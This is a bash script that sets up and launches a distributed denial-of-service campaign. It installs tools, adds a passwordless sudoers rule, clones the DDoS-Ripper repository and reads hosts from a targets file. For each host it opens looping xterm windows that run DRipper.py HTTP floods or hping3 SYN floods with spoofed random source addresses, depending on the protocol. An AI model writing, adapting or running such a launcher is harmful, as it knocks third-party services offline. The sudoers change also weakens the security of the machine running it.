#!/usr/bin/env bash

# Debug
#set -x

# Config
basedir=$(readlink -f $(dirname "$BASH_SOURCE"))
work_dir="${basedir}/cache"
target_file="${basedir}/targets.txt"
apt_req=(python3-virtualenv git xterm docker.io vim htop iotop nload cpulimit nmap telnet)
python_req=""
#dripper_restart_every=600
dripper_max_memory_per_process="128M"

# Install dependencies
apt_req_real=()
for i in ${apt_req[@]}; do
  if ! dpkg-query -l $i > /dev/null; then
    apt_req_real+=("$i")
  fi
done
if [[ ! ${#apt_req_real[@]} == 0 ]]; then
  sudo apt update
  sudo apt install -Vy ${apt_req_real[@]}
fi

# Grant permissions for local docker
if [[ $(groups | grep -c docker) == 0 ]]; then
  sudo usermod -a -G docker ${USER}
  echo "User groups was changed!!! Please, restart your sustem to apply this settings!!!"
  exit 0
fi

# Configure sudo
if [[ ! -f /etc/sudoers.d/user || $(grep -c 'user ALL = NOPASSWD: /usr/bin/systemd-run' /etc/sudoers.d/user) == 0 ]]; then
  echo "user ALL = NOPASSWD: /usr/bin/systemd-run" | sudo tee /etc/sudoers.d/user
fi

# Create workdir and download sources
if [[ ! -d ${work_dir} ]]; then
  mkdir -p ${work_dir}
  git clone https://github.com/palahsu/DDoS-Ripper.git ${work_dir}/tmp
  cp -rf ${work_dir}/tmp/* ${work_dir}/
  rm -rf ${work_dir}/tmp
fi

# Go to workdir
cd ${work_dir}

# Create virtualenv for python
if [[ ! -d env ]]; then
  virtualenv -p /usr/bin/python3 env
fi

# TODO: Create if statement for this block
# Activate python virtualenv and run python commands in it
install_py_req () {
  source env/bin/activate

  # Install python dependencies
  touch requirements.txt && > requirements.txt
  for i in ${python_req[@]}; do
    echo $i >> requirements.txt
  done
  pip install -r requirements.txt
}
install_py_req

# Start deploy
for i in $(cat ${target_file} | grep -v ^# | grep -xv '' | xargs); do
  host=$(printf "${i}" | cut -d ":" -f 1)
  ip=$(dig +tries=0 +time=3 +short $host)
  port=$(printf "${i}" | cut -d ":" -f 2)
  proto=$(printf "${i}" | cut -d ":" -f 3)

  # Run for HTTP
  if [[ "${proto}" == "http" ]]; then 
    #xterm -T "$i" -fa "Monospace" -fs 11 -e /bin/bash -l -c "while true; do timeout ${dripper_restart_every} env/bin/python -u DRipper.py -q -s ${ip} -p ${port} -t 135; done; echo 'Process exited. Press enter for close window...'; read" &
    xterm -T "$i" -fa "Monospace" -fs 11 -e /bin/bash -l -c "while true; do sudo systemd-run --scope -p MemoryLimit=${dripper_max_memory_per_process} env/bin/python -u DRipper.py -q -s ${ip} -p ${port} -t 135; done; echo 'Process exited. Press enter for close window...'; read" &
  fi

  # Run for UDP
  if [[ "${proto}" == "udp" ]]; then 
    xterm -T "$i" -fa "Monospace" -fs 11 -e /bin/bash -l -c "docker run --rm -it sflow/hping3 -2 -D -S --flood --rand-source -V -u -p ${port} ${ip}; echo 'Process exited. Press enter for close window...'; read" &
  fi

  # Run for TCP
  if [[ "${proto}" == "tcp" ]]; then 
    xterm -T "$i" -fa "Monospace" -fs 11 -e /bin/bash -l -c "docker run --rm -it sflow/hping3 -d 120 -w 64 -D -S --flood --rand-source -V -u -p ${port} ${ip}; echo 'Process exited. Press enter for close window...'; read" &
  fi
done
